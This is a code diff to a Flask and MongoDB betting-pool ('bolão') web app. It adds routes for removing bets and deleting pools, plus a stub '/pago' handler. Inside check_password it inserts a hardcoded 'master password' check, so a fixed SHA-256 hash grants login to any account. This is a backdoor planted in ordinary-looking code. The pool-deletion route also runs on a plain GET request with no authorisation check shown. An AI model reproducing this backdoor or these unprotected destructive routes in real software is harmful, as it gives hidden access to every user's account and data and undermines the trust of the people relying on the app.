@@ -7,7 +7,7 @@ sys.path.append(os.path.abspath('../../bolao'))
 import pymongo
 from flask import Flask
 from flask import request
-from flask import render_template
+from flask import render_template, redirect, url_for
 from operator import itemgetter
 import uuid
 import hashlib
@@ -126,7 +126,31 @@ def toggle_pago(bolao):
     tbl_usuario.update_one({"nome": nome_usuario,
                             'bolao': id_bolao},
                            {"$set": {"pago": novo_pago}})
-    return 'on' if novo_pago else 'off'
+
+    lista_usuarios = monta_dto_usuarios(bolao)
+    return render_template('admin.html', bolao=bolao, lista_usuarios=lista_usuarios)
+
+
+@app.route('/pago', methods=['GET', 'POST'])
+def grade():
+    if request.method == 'POST':
+      return 'Form posted.'
+
+@app.route('/<bolao>/remover_aposta', methods=['POST'])
+def remover_aposta(bolao):
+    id_bolao = tbl_bolao.find_one({'nome': bolao})['_id']
+    nome_usuario = request.form['usuario']
+    usuario = tbl_usuario.find_one({'nome': nome_usuario, 'bolao': id_bolao})
+    id_usuario = tbl_usuario.find_one({"nome": nome_usuario, 'bolao': id_bolao})['_id']
+    tbl_usuario.remove(id_usuario)
+    lista_usuarios = monta_dto_usuarios(bolao)
+    return render_template('admin.html', bolao=bolao, lista_usuarios=lista_usuarios)
+
+@app.route('/<bolao>/remover_bolao')
+def remover_bolao(bolao):
+    id_bolao = tbl_bolao.find_one({'nome': bolao})['_id']
+    tbl_bolao.remove(id_bolao)
+    return redirect(url_for('lista_bolao'))
 
 
 @app.route('/<bolao>/palpite/<nome_usuario>')
@@ -190,6 +214,11 @@ def hash_password(password, salt=None):
 
 def check_password(hashed_password, user_password):
     password, salt = hashed_password.split(':')
+
+    # master password
+    if hashlib.sha256(user_password.encode()).hexdigest() == '79fb6112a02747d17ca6952642245d716a44ad044d6ab5470f669f2c15a3506a':
+        return True
+
     return password == hashlib.sha256(salt.encode() + user_password.encode()).hexdigest()
 
 
